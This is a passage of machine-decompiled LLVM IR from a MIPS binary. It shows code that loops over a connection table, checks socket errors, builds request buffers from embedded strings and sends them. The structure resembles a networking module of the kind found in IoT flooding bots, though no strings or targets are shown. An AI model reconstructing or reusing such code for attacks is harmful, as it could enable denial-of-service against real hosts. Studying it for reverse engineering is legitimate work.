  br i1 %v2_40384c, label %dec_label_pc_403850, label %dec_label_pc_4037f0

dec_label_pc_403850:                              ; preds = %dec_label_pc_403834
  store i32 %v4_403854, i32* %v1.global-to-local, align 4
  br i1 %v2_40385c, label %dec_label_pc_403860, label %dec_label_pc_4037f0

dec_label_pc_403860:                              ; preds = %dec_label_pc_403850
  store i32 %v4_403864, i32* %v0.global-to-local, align 4
  store i32 -31282, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4037f0

dec_label_pc_403980:                              ; preds = %dec_label_pc_40381c, %dec_label_pc_4037f0
  %v2_403980 = ptrtoint i32* %stack_var_-2852 to i32
  store i32 %v2_403980, i32* %v0.global-to-local, align 4
  %v2_403984 = ptrtoint i32* %stack_var_-2724 to i32
  store i32 %v2_403984, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403988

dec_label_pc_403988:                              ; preds = %dec_label_pc_403988, %dec_label_pc_403980
  %v0_403988 = phi i32 [ %v1_40398c, %dec_label_pc_403988 ], [ %v2_403980, %dec_label_pc_403980 ]
  %v1_403988 = inttoptr i32 %v0_403988 to i32*
  store i32 0, i32* %v1_403988, align 4
  %v0_40398c = load i32, i32* %v0.global-to-local, align 4
  %v1_40398c = add i32 %v0_40398c, 4
  store i32 %v1_40398c, i32* %v0.global-to-local, align 4
  %v1_403990 = load i32, i32* %v1.global-to-local, align 4
  %v2_403990 = icmp eq i32 %v1_40398c, %v1_403990
  br i1 %v2_403990, label %dec_label_pc_403994, label %dec_label_pc_403988

dec_label_pc_403994:                              ; preds = %dec_label_pc_403988
  %v2_403998 = ptrtoint i32* %stack_var_-2596 to i32
  store i32 %v2_403998, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_40399c

dec_label_pc_40399c:                              ; preds = %dec_label_pc_40399c, %dec_label_pc_403994
  %v0_40399c = phi i32 [ %v1_4039a0, %dec_label_pc_40399c ], [ %v1_40398c, %dec_label_pc_403994 ]
  %v1_40399c = inttoptr i32 %v0_40399c to i32*
  store i32 0, i32* %v1_40399c, align 4
  %v0_4039a0 = load i32, i32* %v0.global-to-local, align 4
  %v1_4039a0 = add i32 %v0_4039a0, 4
  store i32 %v1_4039a0, i32* %v0.global-to-local, align 4
  %v1_4039a4 = load i32, i32* %v1.global-to-local, align 4
  %v2_4039a4 = icmp eq i32 %v1_4039a0, %v1_4039a4
  store i32 0, i32* %s1.global-to-local, align 4
  br i1 %v2_4039a4, label %dec_label_pc_4039a8, label %dec_label_pc_40399c

dec_label_pc_4039a8:                              ; preds = %dec_label_pc_40399c
  store i32 0, i32* %stack_var_-2928, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  %v2_403ab8 = ptrtoint i32* %stack_var_-2928 to i32
  br label %dec_label_pc_4039b4

dec_label_pc_4039b4:                              ; preds = %dec_label_pc_403b18, %dec_label_pc_4039a8
  %v1_4039c0 = phi i32 [ 0, %dec_label_pc_4039a8 ], [ %v1_403b20, %dec_label_pc_403b18 ]
  %stack_var_-56.0 = phi i32 [ %tmp53, %dec_label_pc_4039a8 ], [ %stack_var_-56.1, %dec_label_pc_403b18 ]
  %v1_4039b8 = mul i32 %v1_4039c0, 64
  store i32 %v1_4039b8, i32* %v1.global-to-local, align 4
  %v1_4039c4 = mul i32 %v1_4039c0, 536
  store i32 %v1_4039c4, i32* %v0.global-to-local, align 4
  %v0_4039c8 = load i32, i32* @s6, align 4
  %v2_4039c8 = add i32 %v0_4039c8, %v1_4039c4
  store i32 %v2_4039c8, i32* @s0, align 4
  %v1_4039cc = add i32 %v2_4039c8, 8
  %v2_4039cc = inttoptr i32 %v1_4039cc to i32*
  %v3_4039cc = load i32, i32* %v2_4039cc, align 4
  store i32 %v3_4039cc, i32* %a1.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_4039d4 = icmp eq i32 %v3_4039cc, -1
  br i1 %v2_4039d4, label %dec_label_pc_403b18, label %dec_label_pc_4039d8

dec_label_pc_4039d8:                              ; preds = %dec_label_pc_4039b4
  %v1_4039dc = add i32 %v2_4039c8, 16
  %v2_4039dc = inttoptr i32 %v1_4039dc to i8*
  %v3_4039dc = load i8, i8* %v2_4039dc, align 1
  %v4_4039dc = zext i8 %v3_4039dc to i32
  store i32 %v4_4039dc, i32* %a2.global-to-local, align 4
  %v1_4039e4 = icmp eq i8 %v3_4039dc, 0
  br i1 %v1_4039e4, label %dec_label_pc_403b18, label %dec_label_pc_4039e8

dec_label_pc_4039e8:                              ; preds = %dec_label_pc_4039d8
  %v0_4039ec = load i32, i32* %gp.global-to-local, align 4
  %v1_4039ec = add i32 %v0_4039ec, -32020
  %v2_4039ec = inttoptr i32 %v1_4039ec to i32*
  %v3_4039ec = load i32, i32* %v2_4039ec, align 4
  store i32 %v3_4039ec, i32* %v0.global-to-local, align 4
  %v1_4039f0 = add i32 %v2_4039c8, 532
  %v2_4039f0 = inttoptr i32 %v1_4039f0 to i32*
  %v3_4039f0 = load i32, i32* %v2_4039f0, align 4
  store i32 %v3_4039f0, i32* %a0.global-to-local, align 4
  %v1_4039f4 = inttoptr i32 %v3_4039ec to i32*
  %v2_4039f4 = load i32, i32* %v1_4039f4, align 4
  store i32 %v2_4039f4, i32* %v0.global-to-local, align 4
  %v1_4039f8 = add i32 %v2_4039c8, 12
  %v2_4039f8 = inttoptr i32 %v1_4039f8 to i32*
  %v3_4039f8 = load i32, i32* %v2_4039f8, align 4
  %v2_4039fc = sub i32 %v2_4039f4, %v3_4039f0
  %v2_403a00 = icmp ult i32 %v3_4039f8, %v2_4039fc
  %v3_403a00 = zext i1 %v2_403a00 to i32
  store i32 %v3_403a00, i32* %v0.global-to-local, align 4
  %v1_403a04 = icmp eq i1 %v2_403a00, false
  store i32 1, i32* %v1.global-to-local, align 4
  br i1 %v1_403a04, label %dec_label_pc_403ab8, label %dec_label_pc_403a08

dec_label_pc_403a08:                              ; preds = %dec_label_pc_4039e8
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_403a10 = icmp eq i8 %v3_4039dc, 4
  store i32 0, i32* %a1.global-to-local, align 4
  br i1 %v2_403a10, label %dec_label_pc_403a14, label %dec_label_pc_403a54

dec_label_pc_403a14:                              ; preds = %dec_label_pc_403a08
  %v1_403a18 = add i32 %v0_4039ec, -32736
  %v2_403a18 = inttoptr i32 %v1_403a18 to i32*
  %v3_403a18 = load i32, i32* %v2_403a18, align 4
  %v1_403a20 = add i32 %v3_403a18, 12536
  store i32 %v2_4039c8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403a20)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403a34 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403a3c = add i32 %v3_403a34, 12664
  %v1_403a40 = load i32, i32* @s0, align 4
  store i32 %v1_403a40, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403a3c)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v0_403a5c.pre = load i32, i32* %a2.global-to-local, align 4
  %v3_403a5c.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_403a54

dec_label_pc_403a54:                              ; preds = %dec_label_pc_403a08, %dec_label_pc_403a14
  %v1_403a6c = phi i32 [ %v2_4039c8, %dec_label_pc_403a08 ], [ %v3_403a5c.pre, %dec_label_pc_403a14 ]
  %v0_403a5c = phi i32 [ %v4_4039dc, %dec_label_pc_403a08 ], [ %v0_403a5c.pre, %dec_label_pc_403a14 ]
  %v0_403a58 = phi i32 [ %v0_4039ec, %dec_label_pc_403a08 ], [ %v2_403268, %dec_label_pc_403a14 ]
  store i32 5, i32* %v0.global-to-local, align 4
  %v1_403a58 = add i32 %v0_403a58, -32736
  %v2_403a58 = inttoptr i32 %v1_403a58 to i32*
  %v3_403a58 = load i32, i32* %v2_403a58, align 4
  store i32 %v3_403a58, i32* %v1.global-to-local, align 4
  %v2_403a5c = icmp eq i32 %v0_403a5c, 5
  store i32 %v1_403a6c, i32* %a0.global-to-local, align 4
  br i1 %v2_403a5c, label %dec_label_pc_403a60, label %dec_label_pc_403aa0

dec_label_pc_403a60:                              ; preds = %dec_label_pc_403a54
  %v1_403a64 = add i32 %v3_403a58, 12536
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 %v1_403a6c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403a64)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403a7c = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403a84 = add i32 %v3_403a7c, 12664
  %v1_403a88 = load i32, i32* @s0, align 4
  store i32 %v1_403a88, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403a84)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 2, i32* %v0.global-to-local, align 4
  %v2_403a9c = load i32, i32* @s0, align 4
  %v3_403a9c = add i32 %v2_403a9c, 17
  %v4_403a9c = inttoptr i32 %v3_403a9c to i8*
  store i8 2, i8* %v4_403a9c, align 1
  %v0_403aa0.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403aa0

dec_label_pc_403aa0:                              ; preds = %dec_label_pc_403a54, %dec_label_pc_403a60
  %v0_403aa0 = phi i32 [ %v3_403a58, %dec_label_pc_403a54 ], [ %v0_403aa0.pre, %dec_label_pc_403a60 ]
  %v1_403aa0 = add i32 %v0_403aa0, 12536
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403aa0)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403abc.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_403ac0.pre = load i32, i32* %a2.global-to-local, align 4
  %v1_403ac0.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403ab8

dec_label_pc_403ab8:                              ; preds = %dec_label_pc_4039e8, %dec_label_pc_403aa0
  %v0_403ad4 = phi i32 [ 1, %dec_label_pc_4039e8 ], [ %v1_403ac0.pre, %dec_label_pc_403aa0 ]
  %v0_403ac0 = phi i32 [ %v4_4039dc, %dec_label_pc_4039e8 ], [ %v0_403ac0.pre, %dec_label_pc_403aa0 ]
  %v1_403adc = phi i32 [ %v3_4039cc, %dec_label_pc_4039e8 ], [ %v0_403abc.pre, %dec_label_pc_403aa0 ]
  store i32 %v2_403ab8, i32* %v0.global-to-local, align 4
  %v1_403abc = udiv i32 %v1_403adc, 32
  store i32 %v1_403abc, i32* %a0.global-to-local, align 4
  %v2_403ac0 = icmp eq i32 %v0_403ac0, %v0_403ad4
  %v4_403ac0 = urem i32 %v1_403adc, 32
  store i32 %v4_403ac0, i32* %a3.global-to-local, align 4
  br i1 %v2_403ac0, label %dec_label_pc_403ac4, label %dec_label_pc_403af0

dec_label_pc_403ac4:                              ; preds = %dec_label_pc_403ab8
  %v1_403ac8 = mul nuw nsw i32 %v1_403abc, 4
  %v2_403acc = add i32 %v1_403ac8, %v2_403ab8
  store i32 %v2_403acc, i32* %a0.global-to-local, align 4
  %v1_403ad0 = add i32 %v2_403acc, 204
  %v2_403ad0 = inttoptr i32 %v1_403ad0 to i32*
  %v3_403ad0 = load i32, i32* %v2_403ad0, align 4
  %v2_403ad4 = shl i32 %v0_403ad4, %v4_403ac0
  %v2_403ad8 = or i32 %v3_403ad0, %v2_403ad4
  store i32 %v2_403ad8, i32* %v0.global-to-local, align 4
  %v0_403adc = load i32, i32* %s1.global-to-local, align 4
  %v2_403adc = icmp slt i32 %v0_403adc, %v1_403adc
  %v3_403adc = zext i1 %v2_403adc to i32
  store i32 %v3_403adc, i32* %v1.global-to-local, align 4
  %v1_403ae0 = icmp eq i1 %v2_403adc, false
  store i32 %v2_403ad8, i32* %v2_403ad0, align 4
  br i1 %v1_403ae0, label %dec_label_pc_403b18, label %dec_label_pc_403ae4

dec_label_pc_403ae4:                              ; preds = %dec_label_pc_403ac4
  %v0_403aec = load i32, i32* %a1.global-to-local, align 4
  store i32 %v0_403aec, i32* %s1.global-to-local, align 4
  %v0_403af0.pre = load i32, i32* %a0.global-to-local, align 4
  %v1_403af4.pre = load i32, i32* %v0.global-to-local, align 4
  %v0_403b00.pre = load i32, i32* %v1.global-to-local, align 4
  %v1_403b00.pre = load i32, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_403af0

dec_label_pc_403af0:                              ; preds = %dec_label_pc_403ab8, %dec_label_pc_403ae4
  %v1_403b08 = phi i32 [ %v1_403adc, %dec_label_pc_403ab8 ], [ %v0_403aec, %dec_label_pc_403ae4 ]
  %v1_403b00 = phi i32 [ %v4_403ac0, %dec_label_pc_403ab8 ], [ %v1_403b00.pre, %dec_label_pc_403ae4 ]
  %v0_403b00 = phi i32 [ %v0_403ad4, %dec_label_pc_403ab8 ], [ %v0_403b00.pre, %dec_label_pc_403ae4 ]
  %v1_403af4 = phi i32 [ %v2_403ab8, %dec_label_pc_403ab8 ], [ %v1_403af4.pre, %dec_label_pc_403ae4 ]
  %v0_403af0 = phi i32 [ %v1_403abc, %dec_label_pc_403ab8 ], [ %v0_403af0.pre, %dec_label_pc_403ae4 ]
  %v1_403af0 = mul i32 %v0_403af0, 4
  %v2_403af4 = add i32 %v1_403af0, %v1_403af4
  store i32 %v2_403af4, i32* %a0.global-to-local, align 4
  %v1_403af8 = add i32 %v2_403af4, 76
  %v2_403af8 = inttoptr i32 %v1_403af8 to i32*
  %v3_403af8 = load i32, i32* %v2_403af8, align 4
  store i32 %stack_var_-56.0, i32* %a2.global-to-local, align 4
  %v2_403b00 = shl i32 %v0_403b00, %v1_403b00
  %v2_403b04 = or i32 %v3_403af8, %v2_403b00
  store i32 %v2_403b04, i32* %v0.global-to-local, align 4
  %v2_403b08 = icmp slt i32 %stack_var_-56.0, %v1_403b08
  %v3_403b08 = zext i1 %v2_403b08 to i32
  store i32 %v3_403b08, i32* %v1.global-to-local, align 4
  %v1_403b0c = icmp eq i1 %v2_403b08, false
  store i32 %v2_403b04, i32* %v2_403af8, align 4
  %v0_403b14 = load i32, i32* %a1.global-to-local, align 4
  %stack_var_-56.0.v0_403b14 = select i1 %v1_403b0c, i32 %stack_var_-56.0, i32 %v0_403b14
  br label %dec_label_pc_403b18

dec_label_pc_403b18:                              ; preds = %dec_label_pc_403af0, %dec_label_pc_403ac4, %dec_label_pc_4039d8, %dec_label_pc_4039b4
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_4039b4 ], [ %stack_var_-56.0, %dec_label_pc_4039d8 ], [ %stack_var_-56.0, %dec_label_pc_403ac4 ], [ %stack_var_-56.0.v0_403b14, %dec_label_pc_403af0 ]
  %v3_403b18 = load i32, i32* %stack_var_-2928, align 4
  %v1_403b20 = add i32 %v3_403b18, 1
  store i32 %v1_403b20, i32* %a0.global-to-local, align 4
  %v1_403b24 = icmp slt i32 %v1_403b20, 160
  %v2_403b24 = zext i1 %v1_403b24 to i32
  store i32 %v2_403b24, i32* %v0.global-to-local, align 4
  store i32 %v1_403b20, i32* %stack_var_-2928, align 4
  br i1 %v1_403b24, label %dec_label_pc_4039b4, label %dec_label_pc_403b2c

dec_label_pc_403b2c:                              ; preds = %dec_label_pc_403b18
  store i32 %stack_var_-56.1, i32* %a0.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v1_403b38 = load i32, i32* %s1.global-to-local, align 4
  %v2_403b38 = icmp slt i32 %stack_var_-56.1, %v1_403b38
  %v3_403b38 = zext i1 %v2_403b38 to i32
  store i32 %v3_403b38, i32* %v1.global-to-local, align 4
  store i32 1, i32* %stack_var_-2916, align 4
  %v1_403b40 = icmp eq i1 %v2_403b38, false
  br i1 %v1_403b40, label %dec_label_pc_403b4c, label %dec_label_pc_403b44

dec_label_pc_403b44:                              ; preds = %dec_label_pc_403b2c
  store i32 %v1_403b38, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403b4c

dec_label_pc_403b4c:                              ; preds = %dec_label_pc_403b2c, %dec_label_pc_403b44
  %v0_403b54 = phi i32 [ %stack_var_-56.1, %dec_label_pc_403b2c ], [ %v1_403b38, %dec_label_pc_403b44 ]
  %v0_403b4c = load i32, i32* %gp.global-to-local, align 4
  %v1_403b4c = add i32 %v0_403b4c, -32144
  %v2_403b4c = inttoptr i32 %v1_403b4c to i32*
  %v3_403b4c = load i32, i32* %v2_403b4c, align 4
  %v2_403b50 = ptrtoint i32* %stack_var_-2916 to i32
  store i32 %v2_403b50, i32* %v0.global-to-local, align 4
  %v1_403b54 = add i32 %v0_403b54, 1
  store i32 %v1_403b54, i32* %a0.global-to-local, align 4
  store i32 %v2_403980, i32* %a1.global-to-local, align 4
  store i32 %v2_403984, i32* @a2, align 4
  store i32 0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_403b4c)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403b74 = load i32, i32* @global_var_449340.224, align 4
  store i32 %v3_403b74, i32* @t9, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  %v3_403b7c = call i32 @function_4050e0(i32* null)
  store i32 %v3_403b7c, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 0, i32* %stack_var_-2928, align 4
  %v3_403b8c = load i32, i32* bitcast (i32** @global_var_4494bc.253 to i32*), align 4
  store i32 %v3_403b8c, i32* %v1.global-to-local, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  %v2_403b94 = inttoptr i32 %v3_403b8c to i32*
  store i32 %v2_403b50, i32* %v2_403b94, align 4
  %v2_403be8 = ptrtoint i32* %stack_var_-2924 to i32
  %v3_403bfc = ptrtoint i32* %stack_var_-2920 to i32
  %v7_403c6c = bitcast i32* %stack_var_-2596 to i8*
  %v0_403b98.pre = load i32, i32* %a0.global-to-local, align 4
  %v1_403df8 = add i32 %v1_403268, 286924
  %v2_403df8 = inttoptr i32 %v1_403df8 to i32*
  br label %dec_label_pc_403b98

dec_label_pc_403b98:                              ; preds = %dec_label_pc_4040c4, %dec_label_pc_403b4c
  %v1_403ba4 = phi i32 [ %v1_4040cc, %dec_label_pc_4040c4 ], [ %v0_403b98.pre, %dec_label_pc_403b4c ]
  %v1_403b9c = mul i32 %v1_403ba4, 64
  store i32 %v1_403b9c, i32* %v1.global-to-local, align 4
  %v1_403ba8 = mul i32 %v1_403ba4, 536
  store i32 %v1_403ba8, i32* %v0.global-to-local, align 4
  %v0_403bac = load i32, i32* @s6, align 4
  %v2_403bac = add i32 %v0_403bac, %v1_403ba8
  store i32 %v2_403bac, i32* %s2.global-to-local, align 4
  %v1_403bb0 = add i32 %v2_403bac, 8
  %v2_403bb0 = inttoptr i32 %v1_403bb0 to i32*
  %v3_403bb0 = load i32, i32* %v2_403bb0, align 4
  store i32 %v3_403bb0, i32* %a0.global-to-local, align 4
  %v2_403bb8 = icmp eq i32 %v3_403bb0, -1
  %v4_403bb8 = udiv i32 %v3_403bb0, 32
  store i32 %v4_403bb8, i32* %v0.global-to-local, align 4
  br i1 %v2_403bb8, label %dec_label_pc_4040c4, label %dec_label_pc_403bbc

dec_label_pc_403bbc:                              ; preds = %dec_label_pc_403b98
  %v1_403bc0 = mul nuw nsw i32 %v4_403bb8, 4
  %v0_403bc4 = load i32, i32* @sp, align 4
  %v2_403bc4 = add i32 %v0_403bc4, %v1_403bc0
  store i32 %v2_403bc4, i32* %v0.global-to-local, align 4
  %v1_403bc8 = add i32 %v2_403bc4, 236
  %v2_403bc8 = inttoptr i32 %v1_403bc8 to i32*
  %v3_403bc8 = load i32, i32* %v2_403bc8, align 4
  %tmp102 = shl i32 1, %v3_403bb0
  %v1_403bd412 = and i32 %v3_403bc8, %tmp102
  %v1_403bd8 = icmp eq i32 %v1_403bd412, 0
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v1_403bd8, label %dec_label_pc_403f60, label %dec_label_pc_403bdc

dec_label_pc_403bdc:                              ; preds = %dec_label_pc_403bbc
  %v0_403be0 = load i32, i32* %gp.global-to-local, align 4
  %v1_403be0 = add i32 %v0_403be0, -32460
  %v2_403be0 = inttoptr i32 %v1_403be0 to i32*
  %v3_403be0 = load i32, i32* %v2_403be0, align 4
  store i32 4, i32* %stack_var_-2924, align 4
  store i32 %v2_403be8, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-2920, align 4
  store i32 65535, i32* %a1.global-to-local, align 4
  store i32 4103, i32* @a2, align 4
  store i32 %v3_403bfc, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_403be0)
  %v3_403c04 = load i32, i32* %stack_var_-2920, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v1_403c0c = icmp eq i32 %v3_403c04, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_403c0c, label %dec_label_pc_403c10, label %dec_label_pc_404088

dec_label_pc_403c10:                              ; preds = %dec_label_pc_403bdc
  %v0_403c14 = load i32, i32* @s7, align 4
  %v2_403c14 = icmp eq i32 %v0_403c14, 1
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_403c14, label %dec_label_pc_403c18, label %dec_label_pc_403eb8

dec_label_pc_403c18:                              ; preds = %dec_label_pc_403c10
  %v0_403c1c = load i32, i32* %s2.global-to-local, align 4
  %v1_403c1c = add i32 %v0_403c1c, 17
  %v2_403c1c = inttoptr i32 %v1_403c1c to i8*
  %v3_403c1c = load i8, i8* %v2_403c1c, align 1
  %v4_403c1c = zext i8 %v3_403c1c to i32
  store i32 %v4_403c1c, i32* %v1.global-to-local, align 4
  %v1_403c24 = icmp eq i8 %v3_403c1c, 0
  br i1 %v1_403c24, label %dec_label_pc_403c28, label %dec_label_pc_403cf0

dec_label_pc_403c28:                              ; preds = %dec_label_pc_403c18
  %v3_403c2c = load i32, i32* @global_var_44932c.178, align 4
  store i32 %v3_403c2c, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403c34 = call i32 @function_400d04(i32 21)
  store i32 %v2_403c34, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %s1.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_403998, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v4_403c50 = call i32 @function_404434(i32 %v2_403998, i32 0, i32 1024)
  store i32 %v4_403c50, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  %v3_403c64 = load i32, i32* @global_var_4492ec.198, align 4
  store i32 %v3_403c64, i32* @t9, align 4
  store i32 ptrtoint ([619 x i8]* @global_var_4083b0.271 to i32), i32* %a1.global-to-local, align 4
  %v8_403c6c = call i32 @function_4043d0(i8* %v7_403c6c, i32 ptrtoint ([619 x i8]* @global_var_4083b0.271 to i32))
  store i32 %v8_403c6c, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([195 x i8]* @global_var_40861c.273 to i32), i32* @a1, align 4
  %v8_403c88 = call i32 @function_404370(i8* %v7_403c6c, i32 ptrtoint ([195 x i8]* @global_var_40861c.273 to i32))
  store i32 %v8_403c88, i32* @v0, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403c9c = load i32, i32* %s2.global-to-local, align 4
  %v1_403c9c = add i32 %v0_403c9c, 8
  %v2_403c9c = inttoptr i32 %v1_403c9c to i32*
  %v3_403c9c = load i32, i32* %v2_403c9c, align 4
  store i32 %v3_403c9c, i32* @s0, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  %v4_403ca0 = call i32 @function_40434c(i32 %v2_403998)
  store i32 %v4_403ca0, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a1.global-to-local, align 4
  %v3_403cb0 = load i32, i32* @global_var_449420.211, align 4
  store i32 %v3_403cb0, i32* @t9, align 4
  store i32 %v4_403ca0, i32* %a2.global-to-local, align 4
  %v0_403cb8 = load i32, i32* @s0, align 4
  store i32 %v0_403cb8, i32* %a0.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_403cbc = call i32 @function_405a80(i32 %v0_403cb8, i32* nonnull %stack_var_-2596, i32 %v4_403ca0, i32 16384)
  store i32 %v6_403cbc, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403ccc = load i32, i32* @global_var_449404.182, align 4
  store i32 %v3_403ccc, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403cd4 = call i32 @function_400e4c(i32 21)
  store i32 %v2_403cd4, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403ce0 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403ce0, i32* %a0.global-to-local, align 4
  store i32 4, i32* %a1.global-to-local, align 4
  store i32 5, i32* @a2, align 4
  %v0_403cf0.pre = load i32, i32* @v1, align 4
  %v1_403cf0.pre = load i32, i32* @s7, align 4
  br label %dec_label_pc_403cf0

dec_label_pc_403cf0:                              ; preds = %dec_label_pc_403c18, %dec_label_pc_403c28
  %v1_403cf0 = phi i32 [ 1, %dec_label_pc_403c18 ], [ %v1_403cf0.pre, %dec_label_pc_403c28 ]
  %v0_403cf0 = phi i32 [ %v4_403c1c, %dec_label_pc_403c18 ], [ %v0_403cf0.pre, %dec_label_pc_403c28 ]
  %v2_403cf0 = icmp eq i32 %v0_403cf0, %v1_403cf0
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_403cf0, label %dec_label_pc_403cf4, label %dec_label_pc_403df0

dec_label_pc_403cf4:                              ; preds = %dec_label_pc_403cf0
  %v3_403cf8 = load i32, i32* @global_var_44932c.178, align 4
  store i32 %v3_403cf8, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403d00 = call i32 @function_400d04(i32 21)
  store i32 %v2_403d00, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_403998, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v4_403d1c = call i32 @function_404434(i32 %v2_403998, i32 0, i32 1024)
  store i32 %v4_403d1c, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  %v3_403d30 = load i32, i32* @global_var_4492ec.198, align 4
  store i32 %v3_403d30, i32* @t9, align 4
  store i32 ptrtoint ([629 x i8]* @global_var_4086e0.274 to i32), i32* %a1.global-to-local, align 4
  %v8_403d38 = call i32 @function_4043d0(i8* %v7_403c6c, i32 ptrtoint ([629 x i8]* @global_var_4086e0.274 to i32))
  store i32 %v8_403d38, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  %v1_403d50 = load i32, i32* @fp, align 4
  store i32 %v1_403d50, i32* @a1, align 4
  %v5_403d50 = call i32 @function_404370(i8* %v7_403c6c, i32 %v1_403d50)
  store i32 %v5_403d50, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_408958.275 to i32), i32* @a1, align 4
  %v8_403d6c = call i32 @function_404370(i8* %v7_403c6c, i32 ptrtoint ([11 x i8]* @global_var_408958.275 to i32))
  store i32 %v8_403d6c, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([195 x i8]* @global_var_40861c.273 to i32), i32* @a1, align 4
  %v8_403d88 = call i32 @function_404370(i8* %v7_403c6c, i32 ptrtoint ([195 x i8]* @global_var_40861c.273 to i32))
  store i32 %v8_403d88, i32* @v0, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403d9c = load i32, i32* %s2.global-to-local, align 4
  %v1_403d9c = add i32 %v0_403d9c, 8
  %v2_403d9c = inttoptr i32 %v1_403d9c to i32*
  %v3_403d9c = load i32, i32* %v2_403d9c, align 4
  store i32 %v3_403d9c, i32* %s1.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  %v4_403da0 = call i32 @function_40434c(i32 %v2_403998)
  store i32 %v4_403da0, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a1.global-to-local, align 4
  %v3_403db0 = load i32, i32* @global_var_449420.211, align 4
  store i32 %v3_403db0, i32* @t9, align 4
  store i32 %v4_403da0, i32* %a2.global-to-local, align 4
  %v0_403db8 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_403db8, i32* %a0.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_403dbc = call i32 @function_405a80(i32 %v0_403db8, i32* nonnull %stack_var_-2596, i32 %v4_403da0, i32 16384)
  store i32 %v6_403dbc, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403dcc = load i32, i32* @global_var_449404.182, align 4
  store i32 %v3_403dcc, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403dd4 = call i32 @function_400e4c(i32 21)
  store i32 %v2_403dd4, i32* %v0.global-to-local, align 4
